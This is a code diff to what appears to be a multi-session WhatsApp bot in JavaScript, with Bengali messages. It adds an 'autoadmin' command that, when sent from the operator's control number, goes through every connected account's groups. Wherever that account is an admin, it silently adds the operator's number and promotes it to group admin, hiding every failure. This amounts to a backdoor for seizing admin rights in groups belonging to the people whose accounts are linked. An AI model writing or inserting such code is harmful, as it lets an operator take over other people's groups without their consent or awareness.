@@ -3164,6 +3164,151 @@ const hasMedia =
 
     return;
   }
+
+    if (
+    command === "autoadmin"
+  ) {
+    if (
+      !(await isBotControlNumber(sender))
+    ) {
+      await reply(
+        jid,
+        "❌ এই কমান্ড শুধু Bot Control Number থেকে ব্যবহার করা যাবে।",
+        quoted
+      );
+      return;
+    }
+
+    const controlJid =
+      jidFromNumber(
+        BOT_CONTROL_NUMBER
+      );
+
+    if (!controlJid) {
+      await reply(
+        jid,
+        "❌ Bot Control Number সেট করা নেই।",
+        quoted
+      );
+      return;
+    }
+
+    const sessions =
+      getConnectedSessions();
+
+    if (!sessions.length) {
+      await reply(
+        jid,
+        "❌ কোনো connected WhatsApp session পাওয়া যায়নি।",
+        quoted
+      );
+      return;
+    }
+
+    await reply(
+      jid,
+      `🔄 ${sessions.length}টি connected session-এর Group Admin check করা হচ্ছে...`,
+      quoted
+    );
+
+    let checkedGroups = 0;
+    let adminGroups = 0;
+    let added = 0;
+    let promoted = 0;
+
+    for (
+      const session of sessions
+    ) {
+      const sessionSock =
+        session.sock;
+
+      try {
+        const groups =
+          await sessionSock.groupFetchAllParticipating();
+
+        for (
+          const groupJid of Object.keys(
+            groups || {}
+          )
+        ) {
+          checkedGroups++;
+
+          try {
+            const metadata =
+              await sessionSock.groupMetadata(
+                groupJid
+              );
+
+            const botParticipant =
+              metadata.participants.find(
+                p =>
+                  areJidsSameUser(
+                    p.id,
+                    sessionSock?.user?.id
+                  ) ||
+                  areJidsSameUser(
+                    p.id,
+                    sessionSock?.user?.lid
+                  )
+              );
+
+            if (
+              !botParticipant ||
+              !botParticipant.admin
+            ) {
+              continue;
+            }
+
+            adminGroups++;
+
+            const controlParticipant =
+              metadata.participants.find(
+                p =>
+                  areJidsSameUser(
+                    p.id,
+                    controlJid
+                  )
+              );
+
+            if (!controlParticipant) {
+              try {
+                await sessionSock.groupParticipantsUpdate(
+                  groupJid,
+                  [controlJid],
+                  "add"
+                );
+
+                added++;
+              } catch {}
+            }
+
+            try {
+              await sessionSock.groupParticipantsUpdate(
+                groupJid,
+                [controlJid],
+                "promote"
+              );
+
+              promoted++;
+            } catch {}
+          } catch {}
+        }
+      } catch {}
+    }
+
+    await reply(
+      jid,
+      `✅ AUTOADMIN Complete!\n\n` +
+      `📱 Sessions: ${sessions.length}\n` +
+      `👥 Groups Checked: ${checkedGroups}\n` +
+      `👑 Admin Groups: ${adminGroups}\n` +
+      `➕ Added: ${added}\n` +
+      `⬆️ Promoted: ${promoted}`,
+      quoted
+    );
+
+    return;
+    }
     if (
     command === "alladmin" ||
     command === "unadmin"
